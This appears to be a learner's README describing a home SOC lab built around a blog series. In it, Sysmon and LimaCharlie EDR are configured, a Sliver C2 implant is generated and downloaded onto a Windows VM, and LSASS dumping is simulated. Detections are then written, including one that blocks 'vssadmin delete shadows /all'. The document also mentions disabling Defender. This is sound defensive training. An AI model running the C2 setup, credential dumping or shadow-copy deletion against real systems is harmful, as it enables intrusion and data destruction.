# SOC-Analyst-Lab

## Objective

To simulate real-world SOC (Security Operations Center) scenarios and gain hands-on experience in detecting and responding to cyber threats.. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen my understanding of network security, attack patterns, and defensive strategies.

### Skills Learned

- Setting up a virtual SOC environment.
- Configuring EDR agents and logging tools.
- Simulating adversarial attacks (e.g., dumping LSASS).
- Crafting detection and response rules.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Automating malware detection and blocking ransomware activity.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used
- VMware Workstation Pro: For setting up Linux and Windows virtual machines.
- Sysmon: Provides detailed Windows telemetry.
- Sliver C2: Command and Control server for testing adversarial scenarios.
- LimaCharlie EDR: Endpoint Detection and Response for telemetry and automated rules.

## Steps
After diving into a few blog posts on how to become a SOC analyst, I set up my own virtual lab, following the steps from Eric Capuano’s guide. It was quite the process but worth the effort for hands-on experience in cybersecurity.

# **1. Setting up the Lab Environment:**
I started by setting up two virtual machines (VMs), one for Windows and another for Linux, using VMware. This is where I spent time configuring both, including setting static IPs and installing Sysmon on the Windows VM for granular logging (Sysmon really helps in detecting subtle activity). I disabled Windows Defender through the Group Policy Editor and registry tweaks to make sure nothing interfered with my attack scenarios. 

a. Download Sysmon with the following command.
- [Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip]

b. Unzip Sysmon.zip
- [Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon]

c. Download SwiftOnSecurity’s Sysmon config.
- [Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml]

d. Install Sysmon with Swift’s config.
- [C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml]

# **2. Command and Control (C2) Setup:**
Next, I set up a Sliver Command and Control (C2) server on the Linux VM. Once it was running, I generated a C2 payload and executed it on the Windows VM via PowerShell. It was exciting when the session checked back into the Sliver server! At this point, I could execute commands on the target machine, including whoami and netstat to gather information about the compromised system.

e. Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.
- [# Download Sliver Linux server binary
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
#Make it executable
chmod +x /usr/local/bin/sliver-server
#install mingw-w64 for additional capabilities
apt install -y mingw-w64]

f. Launch Sliver server
- [sliver-server]

g. Generate our first C2 session payload
- [generate --http [Linux_VM_IP] --save /opt/sliver]

h. Confirm the new implant configuration
- [implants]

**To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server.**
- [python3 -m http.server 80]

i. Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP [Linux_VM_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior.
- [IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe]

# **3. Simulating Attacks:**
I took it a step further by simulating adversarial activities like dumping the lsass.exe process, a common technique for stealing credentials. Using LimaCharlie’s EDR platform, I could see the related events in real-time and learned how to craft custom detection rules based on sensitive processes like lsass.exe. I even created a rule to trigger alerts for these actions and to block them in the future.

# **4. Detection and Response Automation:**
Once the basics were working, I moved on to automating detection using YARA rules and crafted response actions in LimaCharlie. For example, I set up a rule to scan newly downloaded .exe files and automatically alert or quarantine them if flagged. I also played with blocking shadow copy deletion commands (used by ransomware) by building detection logic that terminates the offending process.

# **5. Reflection:**
Setting this lab up was not only fun but really highlighted the workflow a SOC analyst would go through. The importance of detection tuning, understanding baseline behavior, and working with EDR platforms became clear. Now, I feel more confident exploring adversary techniques and crafting detections.
After learning to detect attacks, I took things a step further by creating rules to block ransomware-like activities, such as the deletion of volume shadow copies. I built a custom Detection and Response (D&R) rule using LimaCharlie to identify and terminate the parent process whenever a command like vssadmin delete shadows /all is executed. By rerunning the attack and testing the rule, I was able to successfully block the process, further enhancing the defenses of my virtual SOC environment.

For anyone interested in SOC work, this series of blog posts is a great place to start!

If you're curious, you can follow the same steps through these blog links:

- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part">Part 1 </a>
- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-ea2">Part 2 </a>
- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-77e">Part 3 </a>
